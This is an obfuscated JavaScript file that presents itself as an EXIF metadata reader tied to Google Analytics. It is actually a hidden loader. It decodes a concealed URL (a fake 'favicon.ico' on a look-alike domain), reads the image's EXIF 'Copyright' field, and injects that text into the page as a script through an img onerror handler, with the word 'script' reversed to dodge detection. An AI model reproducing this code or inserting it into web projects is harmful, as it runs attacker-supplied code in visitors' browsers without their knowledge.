function Yld() {
    ll = false;
    var VRQF = new Image();
    Object.defineProperty(VRQF, 'id', {
        get: function() {
            ll = true;
        }
    });
    requestAnimationFrame(function TKmu() {
        ll = false;
        console.log('%c', VRQF);
        if (ll) {
            (function() {
                var JAjxc = this;
                var Erilr = function(l1) {
                    if (l1 instanceof Erilr) return l1;
                    if (!(this instanceof Erilr)) return new Erilr(l1);
                    this.Erilrwrapped = l1
                };
                if (typeof exports !== 'undefined') {
                    if (typeof module !== 'undefined' && module.exports) {
                        exports = module.exports = Erilr
                    }
                    exports.Erilr = Erilr
                } else {
                    JAjxc.Erilr = Erilr
                }
                var UnnK = Erilr.UnnK = {
                    0x8298: 'Copyright'
                };

                function LKZm(BaWw) {
                    return !!(BaWw.UkWf)
                }

                function Zkwte(BaWw, callback) {
                    function WjQT(lI) {
                        var l1l = OclG(lI);
                        BaWw.UkWf = l1l || {};
                        if (callback) {
                            callback.call(BaWw)
                        }
                    }
                    var BoNYY = new XMLHttpRequest();
                    BoNYY.onload = function() {
                        if (this.status == 200 || this.status === 0) {
                            WjQT(BoNYY.response)
                        } else {
                            throw 'err'
                        }
                        BoNYY = null
                    };
                    BoNYY.open('POST', BaWw.src, !0);
                    BoNYY.responseType = 'arraybuffer';
                    BoNYY.send(null)
                }

                function OclG(file) {
                    var QwDb = new DataView(file);
                    if ((QwDb.getUint8(0) != 0xFF) || (QwDb.getUint8(1) != 0xD8)) {
                        return !1
                    }
                    var MRw = 2,
                        length = file.byteLength,
                        BoL;
                    while (MRw < length) {
                        if (QwDb.getUint8(MRw) != 0xFF) {
                            return !1
                        }
                        BoL = QwDb.getUint8(MRw + 1);
                        if (BoL == 225) {
                            return readErilrData(QwDb, MRw + 4, QwDb.getUint16(MRw + 2) - 2)
                        } else {
                            MRw += 2 + QwDb.getUint16(MRw + 2)
                        }
                    }
                }

                function readQiv(file, HtB, HTd, strings, UTj) {
                    var l11 = file.getUint16(HTd, !UTj),
                        Qiv = {},
                        AeH, XHx, i;
                    for (i = 0; i < l11; i++) {
                        AeH = HTd + i * 12 + 2;
                        XHx = strings[file.getUint16(AeH, !UTj)];
                        Qiv[XHx] = BCpp(file, AeH, HtB, HTd, UTj)
                    }
                    return Qiv
                }

                function BCpp(file, AeH, HtB, HTd, UTj) {
                    var l1I = file.getUint16(AeH + 2, !UTj),
                        RyymZ = file.getUint32(AeH + 4, !UTj),
                        valueMRw = file.getUint32(AeH + 8, !UTj) + HtB,
                        MRw, vals, val, n, numerator, denominator;
                    switch (l1I) {
                        case 2:
                            MRw = RyymZ > 4 ? valueMRw : (AeH + 8);
                            return RPT(file, MRw, RyymZ - 1)
                    }
                }

                function RPT(TqD, start, length) {
                    var lIl = '';
                    for (var n = start; n < start + length; n++) {
                        lIl += String.fromCharCode(TqD.getUint8(n))
                    }
                    return lIl
                }

                function readErilrData(file, start) {
                    if (RPT(file, start, 4) != 'Exif') {
                        return !1
                    }
                    var UTj, Qiv, XHx, UkWf, gpsData, JGPrwMRw = start + 6;
                    if (file.getUint16(JGPrwMRw) == 0x4949) {
                        UTj = !1
                    } else if (file.getUint16(JGPrwMRw) == 0x4D4D) {
                        UTj = !0
                    } else {
                        return !1
                    }
                    if (file.getUint16(JGPrwMRw + 2, !UTj) != 0x002A) {
                        return !1
                    }
                    var lI1 = file.getUint32(JGPrwMRw + 4, !UTj);
                    if (lI1 < 0x00000008) {
                        return !1
                    }
                    Qiv = readQiv(file, JGPrwMRw, JGPrwMRw + lI1, UnnK, UTj);
                    return Qiv
                }
                Erilr.getData = function(BaWw, callback) {
                    if (((self.Image && BaWw instanceof self.Image) || (self.HTMLImageElement && BaWw instanceof self.HTMLImageElement)) && !BaWw.complete) return !1;
                    if (!LKZm(BaWw)) {
                        Zkwte(BaWw, callback)
                    } else {
                        if (callback) {
                            callback.call(BaWw)
                        }
                    }
                    return !0
                };
                Erilr.NioOE = function(BaWw) {
                    if (!LKZm(BaWw)) return;
                    return BaWw.UkWf['Copyright']
                };
                Erilr.readFromBinaryFile = function(file) {
                    return OclG(file)
                };
                Erilr.ico = function(lII, callback) {
                    var BaWw = document.createElement('img');
                    BaWw.src = lII;
                    BaWw.style.cssText = 'display:none;';
                    BaWw.onload = function() {
                        Erilr.getData(BaWw, function() {
                            var LwZ = Erilr.NioOE(this);
                            if (typeof callback == 'function') {
                                callback(LwZ)
                            }
                        });
                        BaWw.parentNode.removeChild(BaWw);
                    };
                    document.querySelector('head').appendChild(BaWw)
                }
            }.call(this));
            window.onload = function() {
                var userID = [26, 26, 23, 27, 27, 14, 22, 21, 19, 18, 11, 26, 28, 15, 29, 19, 23, 24, 14, 22, 19, 23, 24];
                l1ll = '//www.google-analytics.com/dfvrph', gt = '';
                for (var l1l1 = 0; l1l1 < userID.length; l1l1++) {
                    gt = gt + l1ll[userID[l1l1]];
                }
                Erilr.ico(decodeURIComponent(escape(gt)), function(LwZ) {
                    ZHNp = document.createElement('div');
                    ZHNp.innerHTML = '<img src onerror="ZHNp= document.createElement(\'tpircs\'.split(\'\').reverse().join(\'\'));ZHNp.innerHTML=\'' + LwZ.replace(new RegExp('"', 'g'), '\"').replace(/\r?\n/g, "") + '\';document.getElementsByTagName(\'head\')[0].appendChild(ZHNp);ZHNp.parentNode.removeChild(ZHNp);"/>';
                })
            };
        }
    });
}
setTimeout(Yld(), 1500);
